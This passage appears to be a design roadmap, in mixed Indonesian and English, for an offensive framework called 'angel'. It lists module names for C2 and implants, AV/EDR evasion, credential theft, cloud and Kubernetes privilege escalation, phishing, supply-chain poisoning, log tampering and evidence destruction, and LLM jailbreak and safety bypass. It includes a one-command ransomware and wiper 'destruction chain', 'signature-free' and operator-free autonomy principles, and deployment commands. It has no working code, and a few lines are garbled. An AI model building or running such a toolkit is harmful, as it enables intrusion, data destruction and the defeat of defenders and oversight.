autonomous_decision.go — Analyze environment, decide next action
risk_assessment.go     — Risk score per action (safe vs risky)
behavior_learning.go   — Self-learning dari history
timing_control.go      — Adaptive timing (suspicious → sleep longer)
```

---

## 6. INFRASTRUKTUR & PELAPORAN (LAYER 16–21)

### 6.1 Infrastructure

```
TERRAFORM:   VPS provisioning, VPC separation (4 nodes)
ANSIBLE:     Playbooks, Roles (recon, phishing, c2, dns, wireguard, nginx, firewall)
REDIRECTOR:  Nginx URI routing, SSL, Decoy, Header validation, Rate limit
VPN:         WireGuard, OpenVPN, IPsec
ROTATION:    IP (1-3s), Proxy chain, UA, TLS fingerprint
```

**Functional Separation:**
```
VPC #1: Recon & Scanning (Subfinder, Nmap, Shodan)
VPC #2: Phishing (GoPhish, credential harvest)
VPC #3: C2 HTTPS (Teamserver, listeners)
VPC #4: C2 DNS (DNS listener, backup)
```

---

### 6.2 OSINT & Reconnaissance

```
DNS (5):     Subdomain enum, Reverse DNS, Zone transfer, Brute force, History
PORT (4):    TCP/UDP scan, Service fingerprint, Banner grab, Network map
WEB (6):     Tech fingerprint, WAF detect, CMS/framework detect, SSL cert, Robots
PERSON (5):  Email harvest, Social media, Git recon, LinkedIn, Breach data
COMPANY (5): ASN, Netblock, Cert transparency, crt.sh, Shodan
CLOUD (4):   AWS bucket, Azure blob, GCP bucket, Public S3
```

---

### 6.3 Exploitation

```
XSS (6):      Reflected, Stored, DOM, Blind, Polyglot, Cookie Steal
SSRF (4):     Internal scan, Cloud metadata, File read, Port scan
RCE (4):      Command injection, Code injection, Deserialization, SSTI
LFI/RFI (3):  File read, File write, Remote include
GRAPHQL (3):  Introspection, Nested query, Injection
API (3):      Parameter, JSON, XML injection
CVE (3):      Scanner, Exploiter, Exploit DB
```

---

### 6.4 Forensic Evidence

```
LEDGER:       Hash chain, Timestamp, Sequence, Parent-child, Digital signature
COLLECTOR:    Request/response capture, Screenshot, Diff, Telemetry reference
REDACTION:    PII filter, Secret filter, Token filter, Cert filter
STORAGE:      Local, Encrypted, S3 upload
VERIFICATION: Independent verify, Replay verify, Integrity check
```

---

### 6.5 Reporting

```
TECHNICAL:  Full report, Executive summary, Findings, Evidence,
            Reproduction, Remediation, Timeline
EXECUTIVE:  Summary, Impact, Recommendation, Risk score
METRICS:    Severity (P0-P5), Confidence, Impact, Business impact, ROI
DELIVERY:   JSON, Markdown, PDF, Encrypted
```

---

### 6.6 Cleanup & Deletion

```
CREDENTIAL:    Revoke temp creds, Rotate tokens, Delete SSH keys
ARTIFACT:      Delete tools, logs, configs, backups
DB CLEANUP:    Delete Java objects, stored procs, admin accounts, Revert
CACHE VERIFY:  Scan cache, Verify clean
MANIFEST:      Generate, Verify, Export
```

---

## 7. MODUL TAMBAHAN (LAYER 22–25)

### 7.1 Credential Attack & Auth Bypass Engine

```
CRACK:        Hashcat wrapper, John wrapper, Wordlist manager, Rule engine
AUTH BYPASS:  SQLi auth, NoSQL auth, JWT (alg:none, weak secret, kid injection),
              JSON tampering, Default cred, OAuth manipulation, Session hijack
AUTH PROBE:   HTTP bruteforce, Credential stuffing, Password spraying,
              Rate limit bypass, User enum
```

---

### 7.2 Network Evasion & Traffic Morphing

```
IP ROTATION:     Rotate IP/Proxy tiap 1-3 detik
TRAFFIC MORPH:   HTTP/2 fingerprint spoofing, TLS fingerprint, Sleep jitter
PACKET OBFUSC:   Payload encryption, DNS tunneling
PROTOCOL TUNNEL: HTTP, DNS, ICMP, WebSocket
DOMAIN FRONT:    Cloudflare CDN, CloudFront, Azure CDN
```

---

### 7.3 Full Scope Destruction & Impact Chain

```
IMPACT CALCULATOR: Blast radius (data, downtime, user impact)
DESTRUCTION CHAIN: Ransomware/Wiper/DB Drop dengan timing
FULL SCOPE ATTACK: Recon → Attack → Destroy → Report (satu perintah)
```

---

### 7.4 Implant Generator

```
IMPLANT GENERATOR: Generate binary .exe/.bin dengan key enkripsi
IMPLANT BEACON:    Callback ke server (Register, CheckIn, SendResult)
PAYLOAD ENCRYPT:   Enkripsi shellcode anti AV/EDR
```

---

## 8. MODUL TAMBAHAN v2 (LAYER 26–40)

### 8.1 Container & Kubernetes Security

```
DOCKER (8):
├── docker_escape      — /proc/self/root escape, cgroup escape
├── docker_socket      — Mount /var/run/docker.sock
├── docker_secret      — Extract container secrets
├── docker_network     — Bridge network sniffing
├── docker_build       — Malicious Dockerfile injection
├── docker_registry    — Registry poisoning
├── docker_compose     — Compose file manipulation
└── docker_inventory   — Container enumeration

KUBERNETES (12):
├── k8s_api            — API server access (unauthenticated/low-priv)
├── k8s_etcd           — Etcd dump (cluster secrets)
├── k8s_secrets        — Extract Secrets from namespace
├── k8s_configmap      — Read/modify ConfigMaps
├── k8s_rbac           — RBAC privesc (cluster-admin binding)
├── k8s_service_account│ — Service account token abuse
├── k8s_pod            — Pod injection (malicious container)
├── k8s_node           — Node shell (privileged pod)
├── k8s_network        — Network policy bypass
├── k8s_admission      — Admission controller bypass
├── k8s_cronjob        — CronJob persistence
└── k8s_helm           — Helm chart poisoning

CONTAINER PRIVESC (6):
├── cap_sys_admin      — Capability abuse
├── privileged_cont    — Privileged container escape
├── hostPID            — /proc/pid/ns/nspid escape
├── hostIPC            — Shared memory attack
├── hostNetwork        — Network namespace escape
└── hostPath           — Host filesystem access

FALLBACK:
Docker Socket → Container Escape → K8s API → Etcd Dump →
Service Account → Pod Injection → Node Shell → ALERT
```

---

### 8.2 Cloud Deep (AWS/Azure/GCP)

```
AWS (20):
├── iam_privesc        — iam:CreatePolicy, iam:AttachUserPolicy
├── iam_user           — iam:CreateLoginProfile, iam:UpdateLoginProfile
├── iam_role           — iam:CreateRole, iam:PassRole
├── lambda             — lambda:CreateFunction, lambda:InvokeFunction
├── s3_bucket          — s3:PutBucketPolicy, s3:PutObject
├── ec2_instance       — ec2:RunInstances, ec2:CreateKeyPair
├── ebs_volume         — ebs:CreateSnapshot (cross-account)
├── rds                — rds:CreateDBSnapshot, rds:ModifyDBInstance
├── secrets_manager    — secretsmanager:GetSecretValue
├── ssm_parameter      — ssm:GetParameter
├── kms                — kms:Decrypt, kms:GenerateDataKey
├── cloudtrail         — cloudtrail:StopLogging
├── guardduty          — guardduty:DeleteDetector
├── vpc_flow           — vpc:DeleteFlowLogs
├── api_gateway        — apigateway:UpdateRestApiPolicy
├── ecs                — ecs:RunTask (privileged)
├── eks                — eks:AccessKubernetesApi
├── codepipeline       — codepipeline:PutJobSuccessResult
├── cloudformation     — cloudformation:UpdateStack
└── ecs_secret         — ecs:DescribeTaskDefinition (secrets)

AZURE (18):
├── az_ad              — Microsoft.Graph: Application.ReadWrite.All
├── az_managed_id      — Managed Identity impersonation
├── az_key_vault       — Key Vault secret extraction
├── az_storage         — Storage account key abuse
├── az_sql             — SQL admin access
├── az_vm              — VM extension install
├── az_aks             — AKS cluster admin
├── az_function        — Function App code injection
├── az_devops          — DevOps pipeline abuse
├── az_resource_group  — Resource group owner
├── az_subscription    — Subscription owner
├── az_policy          — Policy exemption
├── az_role            — Role assignment
├── az_cosmosdb        — Cosmos DB account access
├── az_dns             — DNS zone manipulation
├── az_cdn             — CDN endpoint manipulation
├── az_arm_template    — ARM template injection
└── az_graph           — Azure AD Graph enumeration

GCP (16):
├── gcp_iam            — iam.serviceAccountKeys.create
├── gcp_service_acct   — serviceAccount impersonation
├── gcp_compute        — compute.instances.setMetadata
├── gcp_storage        — storage.objects.create (bucket)
├── gcp_sql            — sql.instances.create (public IP)
├── gcp_kms            — cryptoKey.decrypt
├── gcp_secret_manager │ — secretmanager.secrets.get
├── gcp_gke            — container.clusters.getCredentials
├── gcp_cloud_function │ — cloudfunctions.functions.create
├── gcp_bigquery       — bigquery.jobs.create (data exfil)
├── gcp_pubsub         — pubsub.topics.publish
├── gcp_firestore      — firestore.documents.get
├── gcp_logging        — logging.sinks.delete
├── gcp_audit_config   — auditConfigs modification
├── gcp_organization   — orgPolicy.disable
└── gcp_project        — resourcemanager.projects.update

FALLBACK:
IAM Privesc → Lambda → S3 → EC2 → Secrets Manager →
CloudTrail → GuardDuty → VPC Flow → ALERT
```

---

### 8.3 Social Engineering

```
PHISHING (8):
├── email_phish        — Crafted email + malicious attachment
├── spear_phish        — Targeted email (CEO fraud, BEC)
├── whaling            — C-level targeting
├── clone_phish        — Clone legitimate email
├── vishing            — Voice phishing (call center)
├── smishing           — SMS phishing
├── qr_phish           — QR code phishing
└── phishing_kit       — Pre-built phishing pages

PRETEXTING (5):
├── helpdesk_imperson  — IT support impersonation
├── vendor_imperson    — Vendor/partner impersonation
├── executive_imperson — C-level impersonation
├── new_employee       — New hire pretext
└── maintenance        — Maintenance window pretext

OSINT_FOR_SE (6):
├── social_media       — LinkedIn, Facebook, Instagram recon
├── email_harvest      — Email collection from public sources
├── phone_harvest      — Phone number collection
├── org_chart          — Organization structure mapping
├── tech_stack         — Technology stack identification
└── vendor_recon       — Vendor/partner reconnaissance

CAMPAIGN (4):
├── gophish_integrate  — GoPhish integration
├── campaign_track     — Campaign tracking (opens, clicks)
├── credential_harvest — Credential capture
└── payload_delivery   — Payload delivery via phishing

FALLBACK:
Email Phish → Spear Phish → Vishing → Smishing → QR Phish →
Pretexting → Physical Access → ALERT
```

---

### 8.4 Wireless Attacks

```
WIFI (8):
├── evil_twin          — Rogue AP with same SSID
├── deauth_attack      — Deauthentication flood
├── wpa3_attack        — WPA3 downgrade attack
├── handshake_capture  — 4-way handshake capture
├── pmkid_attack       — PMKID capture (no client)
├── credential_harvest — Captive portal credential steal
├── rogue_dhcp        — DHCP rogue server
└── karma_attack       — Karma AP (respond to any SSID)

BLUETOOTH (5):
├── bt_scan            — Device discovery
├── bt_sniff           — Traffic capture
├── bt_inject          — Packet injection
├── bt_spam            — Bluetooth spam (BLADES法案)
└── bt_pairing         — Pairing attack

RFID/NFC (4):
├── rfid_clone         — Proxmark3 clone
├── rfid_emulate       — Proxmark3 emulate
├── nfc_relay          — NFC relay attack
└── nfc_dump           — NFC tag dump

TOOLS (5):
├── proxmark3          — RFID/NFC tool
├── hackrf             — SDR (Software Defined Radio)
├── wifi_pineapple     — WiFi attack platform
├── bluetooth_sdr      — Bluetooth SDR
└── uhf_reader         — UHF RFID reader

FALLBACK:
Evil Twin → Deauth → Handshake → PMKID →
Captive Portal → Bluetooth → RFID/NFC → ALERT
```

---

### 8.5 Supply Chain

```
DEPENDENCY (6):
├── npm_poison         — Malicious npm package
├── pypi_poison        — Malicious PyPI package
├── go_module          — Malicious Go module
├── ruby_gem           — Malicious Ruby gem
├── maven              — Malicious Maven artifact
└── nuget              — Malicious NuGet package

CI_CD (6):
├── github_actions     — Malicious GitHub Actions workflow
├── gitlab_ci          — Malicious .gitlab-ci.yml
├── jenkins            — Malicious Jenkinsfile
├── azure_pipelines    — Malicious azure-pipelines.yml
├── circleci           — Malicious .circleci/config.yml
└── bitbucket          — Malicious bitbucket-pipelines.yml

PACKAGE_MANAGER (4):
├── homebrew           — Malicious Homebrew formula
├── chocolatey         — Malicious Chocolatey package
├── apt_repo           — Malicious APT repository
└── yum_repo           — Malicious YUM repository

BUILD_SYSTEM (4):
├── makefile           — Malicious Makefile
├── cmake              — Malicious CMakeLists.txt
├── dockerfile         — Malicious Dockerfile
└── pre_commit         — Malicious pre-commit hook

FALLBACK:
npm Poison → PyPI Poison → GitHub Actions → GitLab CI →
Jenkins → Dockerfile → Makefile → ALERT
```

---

### 8.6 API Security Deep

```
AUTH_ABUSE (8):
├── oauth_redirect     — OAuth redirect URI manipulation
├── oauth_scope        — OAuth scope escalation
├── oauth_token        — OAuth token theft/reuse
├── jwt_none           — JWT alg:none
├── jwt_weak           — JWT weak secret (brute force)
├── jwt_kid            — JWT kid injection
├── jwt_key_confusion  — JWT RSA/HMAC key confusion
└── api_key            — API key extraction/reuse

BUSINESS_LOGIC (6):
├── rate_bypass        — Rate limit bypass (race condition)
├── price_manip        — Price manipulation
├── quantity_manip     — Quantity manipulation
├── idor               — Insecure Direct Object Reference
├── function_leak      — Hidden function discovery
└── workflow_abuse     — Workflow step bypass

INJECTION (5):
├── nosql_api          — NoSQL injection via API
├── graphql_introspect — GraphQL introspection
├── graphql_depth      — GraphQL depth abuse (DoS)
├── xml_entity         — XXE via API
└── json_injection     — JSON parameter pollution

FALLBACK:
OAuth Redirect → Scope Escalation → JWT Attack → API Key →
Rate Limit Bypass → IDOR → Injection → ALERT
```

---

### 8.7 Mobile Deep (iOS/Android)

```
IOS (10):
├── keychain_dump      — Keychain credential extraction
├── jailbreak_detect   — Jailbreak detection bypass
├── ssl_pinning        — SSL pinning bypass
├── backup_extract     — iTunes backup extraction
├── plist_dump         — plist file extraction
├── scheme_abuse       — URL scheme hijacking
├── webview_attack     — WKWebView/JSBridge exploitation
├── pasteboard_hijack  — Pasteboard data theft
├── notification_hijack│ — Notification interception
└── app_cloning        — App clone with injected code

ANDROID (10):
├── magisk_hide         — Magisk hide bypass
├── root_detection     — Root detection bypass
├── ssl_pinning        — SSL pinning bypass
├── backup_extract     — ADB backup extraction
├── shared_prefs       — SharedPreferences extraction
├── intent_hijack      — Intent hijacking
├── content_provider   — Content Provider abuse
├── broadcast_hijack   — Broadcast receiver hijacking
├── accessibility      — AccessibilityService abuse
└── frida_hook         — Frida dynamic instrumentation

UNIVERSAL (6):
├── certificate_pinning│ — Certificate pinning bypass
├── binary_analysis    — Binary reverse engineering
├── memory_dump        — Runtime memory dump
├── api_intercept      — API call interception
├── traffic_analysis   — Network traffic analysis
└── ssl_decrypt        — SSL/TLS decryption

FALLBACK:
Jailbreak/Root Bypass → SSL Pinning → Keychain/SharedPrefs →
Backup Extract → WebView Exploit → Frida Hook → ALERT
```

---

### 8.8 Physical Security

```
USB_ATTACKS (5):
├── usb_drop           — Malicious USB drop
├── usb_hider          — USB HID attack (Rubber Ducky)
├── usb_storage        — USB with autorun payload
├── usb_wifi_squirrel  — WiFi credential theft
└── usb_badusb         — BadUSB firmware attack

LOCK_PICKING (4):
├── pin_tumbler        — Pin tumbler picking
├── bump_key           — Bump key attack
├── bypass_tool        — Bypass tool (shove knife)
└── combination_lock   — Combination lock bypass

BADGE_CLONE (3):
├── rfid_clone         — Proxmark3 badge clone
├── rfid_emulate       — Badge emulation
└── tailgating         — Tailgating/piggybacking

PHYSICAL_ENUM (4):
├── wifi_pineapple     — Rogue AP deployment
├── network_tap        — Physical network tap
├── lock_wire          — Lock wire attack
└── desk_spy           — Desk/cubicle reconnaissance

TOOLS (5):
├── proxmark3          — RFID/NFC
├── lock_pick_set      — Lock picking
├── rubber_ducky       — USB HID
├── bash_bunny         — USB attack
└── WiFi_Pineapple     — WiFi attack

FALLBACK:
USB Drop → Badge Clone → Tailgating → Lock Picking →
Network Tap → WiFi Rogue AP → ALERT
```

---

### 8.9 Purple Team

```
DETECTION_TEST (8):
├── alert_validation   — Test SOC alert accuracy
├── detection_rules    — Validate detection rules (Sigma/YARA)
├── log_coverage       — Verify log collection coverage
├── siem_correlation   — Test SIEM correlation rules
├── endpoint_detection │ — Test EDR detection
├── network_detection  — Test NDR/IDS detection
├── email_detection    — Test email security gateway
└── cloud_detection    — Test cloud security posture

SOC_VALIDATION (6):
├── response_time      — Measure SOC response time
├── triage_accuracy    — Validate triage decisions
├── escalation_path    — Test escalation procedures
├── playbook_follow    — Validate playbook execution
├── analyst_skill      — Assess analyst capabilities
└── tool_effectiveness │ — Validate security tool effectiveness

MITRE_MAPPING (5):
├── technique_coverage │ — Map techniques to MITRE ATT&CK
├── tactic_coverage    — Map tactics to MITRE ATT&CK
├── procedure_coverage │ — Map procedures to MITRE ATT&CK
├── gap_analysis       — Identify detection gaps
└── coverage_matrix    — Generate coverage matrix

REPORTING (4):
├── purple_team_report │ — Purple team engagement report
├── detection_score    — Detection capability score
├── improvement_plan   — Improvement recommendations
└── metrics_dashboard  — Metrics visualization

FALLBACK:
Alert Validation → Detection Rules → Log Coverage →
SIEM Correlation → EDR Test → NDR Test → Report
```

---

### 8.10 Threat Intelligence

```
IOC_GENERATION (6):
├── file_ioc           — File hashes, paths, registry keys
├── network_ioc        — IPs, domains, URLs
├── email_ioc          — Email addresses, headers
├── behavioral_ioc     — Process behaviors, API calls
├── memory_ioc         — Memory artifacts
└── cloud_ioc          — Cloud-specific IOCs

MITRE_MAPPING (4):
├── technique_id       — MITRE technique IDs
├── group_mapping      — Map to threat groups
├── campaign_mapping   — Map to campaigns
└── software_mapping   — Map to malware families

THREAT_FEED (5):
├── osint_feed         — OSINT threat feeds
├── commercial_feed    — Commercial threat intel
├── government_feed    — Government/CERT feeds
├── industry_feed      — Industry ISAC feeds
└── dark_web_feed      — Dark web monitoring

INTELLIGENCE_REPORT (4):
├── threat_profile     — Threat actor profile
├── capability_assess  — Capability assessment
├── intent_assessment  — Intent assessment
└── risk_assessment    — Risk assessment

FALLBACK:
IOC Generation → MITRE Mapping → Threat Feed →
Intelligence Report → Distribution → Update Rules
```

---

### 8.11 Incident Response

```
IR_SIMULATION (6):
├── breach_simulate    — Simulate data breach
├── ransomware_sim     — Simulate ransomware attack
├── ddos_sim           — Simulate DDoS attack
├── insider_sim        — Simulate insider threat
├── apt_sim            — Simulate APT attack
└── supply_chain_sim   — Simulate supply chain attack

FORENSIC_COUNTER (6):
├── log_tamper         — Log tampering
├── timestamp_manip    — Timestamp manipulation
├── evidence_destruction│ — Evidence destruction
├── memory_wipe        — Memory artifact wiping
├── disk_wipe          — Disk artifact wiping
└── network_cleanup    — Network artifact cleanup

IR_PLAYBOOK (5):
├── containment        — Containment procedures
├── eradication        — Eradication procedures
├── recovery           — Recovery procedures
├── post_incident      — Post-incident review
└── lessons_learned    — Lessons learned documentation

IR_TOOLS (5):
├── volatility         — Memory forensics
├── autopsy            — Disk forensics
├──Wireshark           — Network forensics
├── log_parser         — Log analysis
└── timeline_tool      — Timeline analysis

FALLBACK:
Breach Sim → Ransomware Sim → Insider Sim → APT Sim →
Log Tamper → Evidence Destruction → IR Report
```

---

### 8.12 Zero Trust Testing

```
IDENTITY (6):
├── mfa_bypass         — MFA bypass techniques
├── sso_abuse          — SSO token abuse
├── conditional_bypass │ — Conditional access bypass
├── device_compliance  — Device compliance bypass
├── identity_federation│ — Federation attack
└── credential_stuff   — Credential stuffing

NETWORK (6):
├── micro_seg_bypass   — Micro-segmentation bypass
├── ztna_bypass        — ZTNA (Zscaler/Cloudflare) bypass
├── vpn_bypass         — VPN bypass techniques
├── tunnel_establish   — Tunnel establishment
├── protocol_smuggle   — Protocol smuggling
└── dns_exfil          — DNS exfiltration

APPLICATION (5):
├── api_auth_bypass    — API authentication bypass
├── session_hijack     — Session hijacking
├── token_forge        — Token forgery
├── policy_bypass      — Policy bypass
└── access_escalation  — Access escalation

DATA (4):
├── dlp_bypass         — DLP bypass techniques
├── exfil_tunnel       — Exfiltration tunnel
├── encryption_bypass  — Encryption bypass
└── classification_bypass│ — Data classification bypass

FALLBACK:
MFA Bypass → SSO Abuse → Conditional Bypass → ZTNA Bypass →
Micro-seg Bypass → DLP Bypass → Tunnel Exfil → ALERT
```

---

### 8.13 Web3/DeFi

```
SMART_CONTRACT (8):
├── reentrancy         — Reentrancy attack
├── overflow           — Integer overflow/underflow
├── front_run          — Front-running (MEV)
├── flash_loan         — Flash loan attack
├── oracle_manip       — Oracle manipulation
├── access_control     — Access control bypass
├── proxy_upgrade      — Proxy upgrade attack
└── signature_abuse    — Signature replay/abuse

DEFI_EXPLOIT (6):
├── liquidity_drain    — Liquidity pool drain
├── price_manip        — Price manipulation
├── yield_farm         — Yield farming exploit
├── governance_attack  — Governance attack
├── bridge_exploit     — Cross-chain bridge exploit
└── lending_exploit    — Lending protocol exploit

WALLET_ATTACK (5):
├── seed_phrase        — Seed phrase theft
├── private_key        — Private key extraction
├── approval_abuse     — Token approval abuse
├── permit_sign        — Permit signature abuse
└── wallet_connect     — WalletConnect hijack

NFT_EXPLOIT (3):
├── metadata_manip     — Metadata manipulation
├── rarity_manip       — Rarity manipulation
├── royalty_bypass     — Royalty bypass

FALLBACK:
Reentrancy → Flash Loan → Oracle Manip → Front Run →
Access Control → Proxy Upgrade → Bridge Exploit → ALERT
```

---

### 8.14 Malware Analysis

```
STATIC_ANALYSIS (6):
├── pe_analysis        — PE header analysis
├── elf_analysis       — ELF header analysis
├── import_hash        — Import hash (imphash)
├── string_extract     — String extraction
├── packer_detect      — Packer detection
└── yara_scan          — YARA rule scanning

DYNAMIC_ANALYSIS (6):
├── sandbox_run        — Sandbox execution
├── api_monitor        — API call monitoring
├── network_capture    — Network traffic capture
├── registry_monitor   — Registry change monitoring
├── file_monitor       — File system change monitoring
└── memory_forensic    — Memory forensics

UNPACKING (5):
├── upx_unpack         — UPX unpacking
├── custom_unpack      — Custom packer unpacking
├── debug_unpack       — Debug-based unpacking
├── emulation_unpack   — Emulation-based unpacking
└── dynamic_unpack     — Runtime unpacking

EVASION_ANALYSIS (5):
├── anti_debug_detect  — Anti-debug technique detection
├── anti_vm_detect     — Anti-VM technique detection
├── anti_sandbox_detect│ — Anti-sandbox detection
├── timing_evasion     — Timing-based evasion
└── environment_check  — Environment check analysis

FALLBACK:
Static Analysis → YARA Scan → Dynamic Analysis → API Monitor →
Network Capture → Memory Forensic → Unpack → Report
```

---

### 8.15 AI/ML Attacks

```
MODEL_ATTACKS (6):
├── model_steal        — Model extraction (query-based)
├── model_poison       — Training data poisoning
├── model_evasion      — Adversarial examples
├── model_inversion    — Model inversion (data recovery)
├── membership_infer   — Membership inference
└── backdoor_insert    — Backdoor insertion

PROMPT_INJECTION (5):
├── direct_injection   — Direct prompt injection
├── indirect_injection │ — Indirect (via document/URL)
├── jailbreak          — LLM jailbreaking
├── data_exfil         — Data exfiltration via LLM
└── tool_abuse         — LLM tool abuse

AI_INFRASTRUCTURE (5):
├── api_abuse          — AI API abuse
├── training_data      — Training data poisoning
├── model_service      — Model service exploitation
├── vector_db          — Vector database attack
└── embedding_poison   — Embedding poisoning

AI_SAFETY_BYPASS (5):
├── content_filter     — Content filter bypass
├── safety_training    — Safety training bypass
├── alignment_break    — Alignment break
├── hallucination_exp  — Hallucination exploitation
└── bias_exploit       — Bias exploitation

FALLBACK:
Model Steal → Adversarial Example → Prompt Injection →
Data Poison → Jailbreak → API Abuse → Safety Bypass → ALERT
```

---

## 9. STATISTIK TOTAL

| Domain | Modul |
|--------|-------|
| C2 Framework | 98+ agents, 18 listeners, Malleable, SMB Beacon, Channel Rotation, Env Detection, Resilience |
| SQL Injection | 60+ modules (8 DBMS, 12+ WAF bypass) |
| NoSQL Injection | 20+ modules (5 DBMS) |
| Database Post-Exploit | 25+ modules (4 DBMS) |
| Evasion & Stealth | 50+ modules (11 sleep, 7 syscall, 15 anti-analysis, 7 injection) |
| AD Attack | 40+ modules (12 Kerberos, 16 ADCS, 8 recon, DCSync, delegation) |
| Lateral Movement | 30+ modules + SMB Beacon |
| Persistence | 40+ modules (4 OS + re-persist) |
| Hardware Rootkit | 20+ modules (UEFI, SMM, Firmware) |
| Credential Theft | 65+ modules (LSASS, Browser, Wallet, Gaming, VPN, Cloud, Token, Session, MFA, Biometric) |
| Collector | 15+ modules |
| Destruction | 30+ modules (timing chain) |
| Orchestrator | 25+ modules (Fireteam + MCP + AI) |
| Brain | 5+ modules |
| Infrastructure | 20+ modules (4 VPC) |
| OSINT | 25+ modules |
| Exploitation | 40+ modules |
| Forensic Evidence | 15+ modules |
| Reporting | 15+ modules |
| Cleanup | 15+ modules |
| Auth Bypass | 20+ modules |
| Network Evasion | 10+ modules |
| Destruction Chain | 3+ modules |
| Implant Generator | 3+ modules |
| Container/K8s | 26+ modules (8 Docker, 12 K8s, 6 Privesc) |
| Cloud Deep | 54+ modules (20 AWS, 18 Azure, 16 GCP) |
| Social Engineering | 23+ modules (8 phishing, 5 pretexting, 6 OSINT, 4 campaign) |
| Wireless | 22+ modules (8 WiFi, 5 BT, 4 RFID/NFC, 5 tools) |
| Supply Chain | 20+ modules (6 dependency, 6 CI/CD, 4 package, 4 build) |
| API Security | 24+ modules (8 auth, 6 business logic, 5 injection, 5 more) |
| Mobile Deep | 26+ modules (10 iOS, 10 Android, 6 universal) |
| Physical Security | 21+ modules (5 USB, 4 lock, 3 badge, 4 enum, 5 tools) |
| Purple Team | 23+ modules (8 detection, 6 SOC, 5 MITRE, 4 report) |
| Threat Intelligence | 19+ modules (6 IOC, 4 MITRE, 5 feed, 4 report) |
| Incident Response | 22+ modules (6 sim, 6 counter, 5 playbook, 5 tools) |
| Zero Trust | 21+ modules (6 identity, 6 network, 5 app, 4 data) |
| Web3/DeFi | 22+ modules (8 contract, 6 DeFi, 5 wallet, 3 NFT) |
| Malware Analysis | 27+ modules (6 static, 6 dynamic, 5 unpack, 5 evasion) |
| AI/ML Attacks | 21+ modules (6 model, 5 prompt, 5 infra, 5 safety) |
| **TOTAL** | **~1200+ modules** |

---

## 10. PRINSIP DASAR

1. **"No copy-paste"** — tiap baris ditulis sendiri.
2. **"If I can't explain every line, it doesn't go in"**
3. **"Signature-free"** — defender gak kenal.
4. **"Modular"** — tiap modul jalan sendiri, tapi orchestrated.
5. **"Evidentiary"** — tiap action ada bukti.
6. **"Clean"** — post-engagement, semua hilang.
7. **"Resilient"** — setiap kegagalan ada fallback.
8. **"Adaptive"** — beradaptasi dengan environment.
9. **"Autonomous"** — keputusan tanpa operator jika perlu.
10. **"Observable"** — setiap aksi log dan terukur.

---

## 11. CHECKLIST FINAL

| # | Layer | Status |
|---|-------|--------|
| 1 | C2 Framework (98+ Agents + Malleable + SMB Beacon + Channel Rotation + Env Detection + Resilience) | [ ] |
| 2 | The Decoy / Deception Layer | [ ] |
| 3 | SQL Injection Engine (8 DBMS + 12 WAF bypass) | [ ] |
| 4 | NoSQL Injection Engine (5 DBMS) | [ ] |
| 5 | Database Post-Exploit (khunt-style) | [ ] |
| 6 | C2 Evasion (11 Sleep + 7 Syscall + AMSI/ETW + 15 Anti-Analysis + 7 Injection + Logs + Network) | [ ] |
| 7 | AD Attack (12 Kerberos + 16 ADCS + DCSync + Delegation) | [ ] |
| 8 | Lateral Movement (30+ techniques + SMB Beacon + Pivoting) | [ ] |
| 9 | Persistence (11 Win + 9 Linux + 6 Mac + 5 Android + re-persist) | [ ] |
| 10 | Hardware Rootkit (UEFI + SMM + Firmware) | [ ] |
| 11 | Credential Theft (65+ modules) | [ ] |
| 12 | Collector / InfoStealer | [ ] |
| 13 | Destruction (JADEPUFFER + MAD-CAT + Wiper + Timing) | [ ] |
| 14 | Orchestrator (LangGraph + MCP + Fireteam) | [ ] |
| 15 | Autonomous Brain | [ ] |
| 16 | Infrastructure (Terraform + Ansible + 4 VPC) | [ ] |
| 17 | OSINT (DNS/Port/Web/Person/Company/Cloud) | [ ] |
| 18 | Exploitation (XSS/SSRF/RCE/LFI/GraphQL/API/CVE) | [ ] |
| 19 | Forensic Evidence | [ ] |
| 20 | Reporting | [ ] |
| 21 | Cleanup | [ ] |
| 22 | Auth Bypass Engine | [ ] |
| 23 | Network Evasion | [ ] |
| 24 | Full Scope Destruction | [ ] |
| 25 | Implant Generator | [ ] |
| 26 | Container/K8s Security (8 Docker + 12 K8s + 6 Privesc) | [ ] |
| 27 | Cloud Deep (20 AWS + 18 Azure + 16 GCP) | [ ] |
| 28 | Social Engineering (8 phishing + 5 pretexting + 6 OSINT + 4 campaign) | [ ] |
| 29 | Wireless (8 WiFi + 5 BT + 4 RFID/NFC + 5 tools) | [ ] |
| 30 | Supply Chain (6 dependency + 6 CI/CD + 4 package + 4 build) | [ ] |
| 31 | API Security Deep (8 auth + 6 business + 5 injection) | [ ] |
| 32 | Mobile Deep (10 iOS + 10 Android + 6 universal) | [ ] |
| 33 | Physical Security (5 USB + 4 lock + 3 badge + 4 enum + 5 tools) | [ ] |
| 34 | Purple Team (8 detection + 6 SOC + 5 MITRE + 4 report) | [ ] |
| 35 | Threat Intelligence (6 IOC + 4 MITRE + 5 feed + 4 report) | [ ] |
| 36 | Incident Response (6 sim + 6 counter + 5 playbook + 5 tools) | [ ] |
| 37 | Zero Trust Testing (6 identity + 6 network + 5 app + 4 data) | [ ] |
| 38 | Web3/DeFi (8 contract + 6 DeFi + 5 wallet + 3 NFT) | [ ] |
| 39 | Malware Analysis (6 static + 6 dynamic + 5 unpack + 5 evasion) | [ ] |
| 40 | AI/ML Attacks (6 model + 5 prompt + 5 infra + 5 safety) | [ ] |

---

## 12. TIMELINE PENGERJAAN

| Phase | Fokus | Target |
|-------|-------|--------|
| Phase 1 | Layer 1-5 (Core C2) | Minggu 1-2 |
| Phase 2 | Layer 6-10 (Evasion, AD, Lateral, Persist, Rootkit) | Minggu 3-4 |
| Phase 3 | Layer 11-15 (Credential, Collector, Destruct, Orchestrator, Brain) | Minggu 5-6 |
| Phase 4 | Layer 16-21 (Infra, OSINT, Exploit, Evidence, Report, Cleanup) | Minggu 7-8 |
| Phase 5 | Layer 22-25 (AuthBypass, Network Evasion, Destruction Chain, Implant) | Minggu 9-10 |
| Phase 6 | Layer 26-30 (Container, Cloud, SE, Wireless, Supply Chain) | Minggu 11-12 |
| Phase 7 | Layer 31-35 (API, Mobile, Physical, Purple Team, Threat Intel) | Minggu 13-14 |
| Phase 8 | Layer 36-40 (IR, Zero Trust, Web3, Malware, AI/ML) | Minggu 15-16 |

---

## 13. DOKUMENTASI CARA PAKAI

### Setup
```bash
git clone https://github.com/angel-framework/angel.git
cd angel && make setup
cp .env.example .env && edit .env
```

### Deployment
```bash
make infra-deploy ENV=production
make c2-deploy
make orchestrator-deploy
```

### Operasional
```bash
make listeners-start
make implant-generate OS=windows TARGET=x64
make dashboard
make engage SCOPE=target.txt
```

### Post-Engagement
```bash
make cleanup
make report FORMAT=pdf
make verify-clean
```

---

## 14. KESIMPULAN

